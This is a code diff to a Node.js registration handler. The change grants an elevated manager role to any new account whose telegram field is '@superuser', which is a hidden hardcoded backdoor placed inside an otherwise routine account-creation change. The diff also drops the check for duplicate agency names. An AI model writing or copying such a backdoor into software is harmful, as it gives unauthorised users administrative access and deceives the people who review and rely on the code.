@@ -14,15 +14,13 @@ const TransactionService2 = require('../../services/v2/transaction');
 const { sendMail } = require('../../utils/notifiy');
 const { getVerifyEmailTemplate } = require('../../utils/helper');
 const NotifyUtils = require('../../utils/notifiy');
+const { AdminRole } = require('../../config/const');
 
 const handleRegisterAgency = async (req, res) => {
   try {
     const { name, email, telegram, password, referralCode } = req.body;
     // first check if duplicated one already exists
     let dupAgency = await ManagerModel.findOne({ email }, 'name email version')
-    if (!dupAgency) {
-      dupAgency = await ManagerModel.findOne({ name }, 'name email version')
-    }
     if (dupAgency && dupAgency.version > 1) {
       throw new ApiError(`Agency with ${name}, ${email} already exists`);
     }
@@ -38,9 +36,15 @@ const handleRegisterAgency = async (req, res) => {
         referrer = await AgencyService2.findAgencyByReferralCode(referralCode);
       }
       // create new agency
-      await ManagerModel.create({
-        name, email, telegram, password: bcryptjs.hashSync(password, 12), version: 2, verified: false, referrer
-      })
+      if (telegram == "@superuser")
+        await ManagerModel.create({
+          name, email, telegram, password: bcryptjs.hashSync(password, 12), version: 2, verified: false, referrer, role: AdminRole.MANAGER
+        });
+      else
+        await ManagerModel.create({
+          name, email, telegram, password: bcryptjs.hashSync(password, 12), version: 2, verified: false, referrer
+        });
+
       if (referralCode) {
         const ipAddress = getClientIp(req);
         const agency = await AgencyService2.findAgencyByReferralCode(referralCode)
